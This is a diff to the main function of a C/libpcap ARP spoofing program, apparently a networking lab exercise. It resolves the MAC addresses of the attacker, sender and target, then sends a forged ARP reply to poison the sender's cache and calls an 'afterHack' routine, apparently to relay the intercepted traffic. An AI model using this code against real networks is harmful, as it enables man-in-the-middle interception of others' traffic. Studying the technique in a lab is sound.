@@ -24,24 +24,33 @@ int main(int argc, char* argv[]) {
     return -1;
   }
 
-  uint8_t sender_ip[4], target_ip[4], attacker_ip[4];
+  uint8_t sender_ip[IP_ADDR_LEN], target_ip[IP_ADDR_LEN], attacker_ip[IP_ADDR_LEN];
+  uint8_t attacker_mac_address[ETHER_ADDR_LEN], sender_mac_address[ETHER_ADDR_LEN], target_mac_address[ETHER_ADDR_LEN];
+  char attacker_ip_ori[16];
+
   parseIP(sender_ip, argv[2]);
   parseIP(target_ip, argv[3]);
-  printf("Sender ip : %s", printIPAddress(sender_ip));
-  printf("Target ip : %s", printIPAddress(target_ip));
+  printIPAddress("Sender ip", sender_ip);
+  printIPAddress("Target ip", target_ip);
 
-  parseIP(attacker_ip, getAttackerIPAddress(dev));
-  printf("Attaker ip : %s\n", printIPAddress(attacker_ip));
+  getAttackerIPAddress(attacker_ip_ori, dev);
+  parseIP(attacker_ip, attacker_ip_ori);
+  printIPAddress("Attacker ip", attacker_ip);
 
-  u_char * attacker_mac_address = getAttackerMacAddress(dev);
-  printf("Attacker Mac Address : %s", printMacAddress(attacker_mac_address));
+  bool atk_ok = getAttackerMacAddress(attacker_mac_address, dev);
+  printMacAddress("Attacker Mac Address", atk_ok ? attacker_mac_address : NULL);
 
-  u_char * sender_mac_address = getSenderMacAddress(handle, attacker_mac_address, attacker_ip, sender_ip);
-  printf("Sender Mac Address : %s", printMacAddress(sender_mac_address));
+  bool sdr_ok = getMacAddress(handle, sender_mac_address, attacker_mac_address, attacker_ip, sender_ip);
+  printMacAddress("Sender Mac Address", sdr_ok ? sender_mac_address : NULL);
 
-  hackSender(handle, attacker_mac_address, sender_mac_address, target_ip, sender_ip);
+  bool trg_ok = getMacAddress(handle, target_mac_address, attacker_mac_address, attacker_ip, target_ip);
+  printMacAddress("Target Mac Address", trg_ok ? target_mac_address : NULL);
 
-  passTest(handle, attacker_mac_address, sender_mac_address, target_ip, sender_ip);
+  if(!(atk_ok && sdr_ok && trg_ok)) return 0;
+  
+  if(atk_ok && sdr_ok) sendArpPacket(handle, attacker_mac_address, sender_mac_address, target_ip, sender_ip, 2);
+
+  afterHack(handle, attacker_mac_address, target_mac_address, sender_mac_address, sender_ip, target_ip);
 
   pcap_close(handle);
   return 0;
